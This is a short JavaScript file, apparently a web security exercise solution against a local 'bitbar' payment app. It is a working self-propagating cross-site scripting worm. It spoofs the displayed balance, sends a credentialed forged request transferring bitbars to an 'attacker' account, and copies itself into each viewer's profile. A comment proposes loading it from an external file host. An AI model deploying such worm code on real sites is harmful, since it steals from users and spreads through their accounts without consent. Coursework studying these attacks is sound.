/// We could upload this file to a public file server
// and user something like <script type="text/javascript" src="UPLOADED_URL"></script>
// URL: https://bayanbox.ir/download/6080596571611379389/f.js
// but we can also use plain js here

document.getElementById("bitbar_display").innerHTML = "10 bitbars";
function dastan() {
    console.log("amo")
    console.log(typeof total)
    if (typeof total !== "number")
        setTimeout(dastan, 100)
    else
        total = 10
}

dastan()

fetch("http://localhost:3000/post_transfer", {
    "headers": {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
    },
    "body": "destination_username=attacker&quantity=1",
    "method": "POST",
    "mode": "cors",
    "credentials": "include",
});

fetch("http://localhost:3000/set_profile", {
    "headers": {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json'
    },
    "body": JSON.stringify({
        "new_profile": document.getElementById("profile").innerHTML
    }),
    "method": "POST",
    "mode": "cors",
    "credentials": "include"
});